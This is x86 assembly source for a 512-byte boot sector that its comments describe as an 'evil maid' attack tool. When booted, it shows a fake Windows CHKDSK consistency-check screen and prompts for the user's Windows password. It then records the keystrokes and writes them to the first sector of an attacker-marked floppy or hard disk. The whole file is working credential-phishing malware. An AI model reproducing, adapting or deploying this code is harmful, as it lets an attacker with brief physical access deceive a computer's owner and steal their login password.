[BITS 16]
[ORG 0x7C00]
jmp start
disknum db 0x99 ; now the first four bytes are E9 81 01 99 so we can find the disk we booted from
                ; we also reuse this spot in memory for the disk we identified as the boot disk

%macro biosprint 1 ; A nice wrapper
mov si, %1
call puts
%endmacro

; print a string - expects that SI is pointing at our string
puts:
  mov al, [si]
  cmp BYTE al, 0
  je exit
  inc si
  call putc
  jmp puts
  exit:
   ret

; print a char to screen - used by puts
putc:
  mov ah, 0x0E
  mov bh, 0x00
  mov bl, 0x11
  int 0x10
  ret

; Busy wait, waits about a second on my Atom notebook
sleep:
  ;mov eax, dword 0xffffffff
  mov eax, 200
  top:
    cmp eax, 5
    jbe end
    dec eax
    jmp top
  end:
    ret

; Assumes that dl is the disk we want to try
; 0x00 = first floppy
; 0x01 = second floppy
; 0x80 = first hard disk
; 0x81 = second hard disk
; Does not check CD-ROM, because we can't write back to it anyways
; Loads first sector, and if successful, compares the fourth byte
; (the first 3 are a jump the start of real code) against a known
; value to identify the evil maid disk. Stores dl in [disknum] if
; it finds the disk (so, if [disknum] is still 0x99, we didn't find it)
find_disk:
  mov ah, 0x02 ; I want to read
  mov dh, 0x00 ; zeroeth head
  mov al, 0x01 ; I want to read one sector
  mov cx, 0x01 ; first sector, zero-eth track
  int 0x13
  jc done_find_disk ; carry bit is set on read error
    mov al, [0x8003]
    cmp al, 0x99
    jne done_find_disk
      mov BYTE [disknum], dl
      jmp done_find_disk
  done_find_disk:
    ret

; Strings
checkfs db 'Windows CHKDSK', 13, 10, '==============', 13, 10, 13, 10, 'Checking file system on C:', 0
ntfs db 13, 10, 'The type of file system is NTFS.', 13, 10, 13, 10, 'One of your disks needs to be checked for consistency.', 13, 10, 13, 10,'Enter your Windows password to continue: ', 0
rmchar db 8,' ',8,0 ; this emulates the action of pressing backspace
checking db 13,10,13,10, 'Cheking volume C:', 13,10,'This may take a few minutes.',0

start:
  xor ax, ax ; we just want to use absolute addresses
  mov ds, ax
  mov es, ax

  biosprint checkfs
  call sleep
  biosprint ntfs

  mov bp, 0x7E00; ; this is where we write our password, and will become the sector we write back
  keep_zeroing:
    mov [bp], BYTE 0x00
    inc bp
    ; TODO This is a bug! Should be 0x8000 is I'm using jb
    cmp bp, 0x7FFF ; 512 bytes from 0x7E00
    jb keep_zeroing

  mov bp, 0x7E00
  readchar:
    mov ah, 00h
    int 0x16
    cmp al, 13
    je done_password
    cmp al, 8
    je backspace
      mov [bp], BYTE al
      inc bp
      mov al, '*'
      call putc
      jmp readchar
    backspace:
      biosprint rmchar
      mov [bp], BYTE 0x00
      dec bp
      jmp readchar
    done_password:
      biosprint checking

  mov bx, 0x8000 ; write sector to this part of memory
  mov dl, 0x00   ; look for our disk
  call find_disk
  mov dl, 0x01
  call find_disk
  mov dl, 0x80
  call find_disk
  mov dl, 0x81
  call find_disk

  ; if we found our disk, write our blanked sector with password
  ; stored to that disk
  cmp BYTE [disknum], 0x99
  je didnt_find_disk
    mov ah, 0x03 ; I want to write
    mov al, 0x01 ; I want to write one sector
    mov ch, 0x00 ; zeroeth track
    mov cl, 0x01 ; first sector
    mov bx, 0x7E00
    mov dh, 0x00 ; zeroeth head
    mov dl, [disknum]
    int 0x13
  didnt_find_disk:

; make this output exactly 512 bytes long, and mark it as bootable
times 510 - ($ - $$) db 0
dw 0xAA55
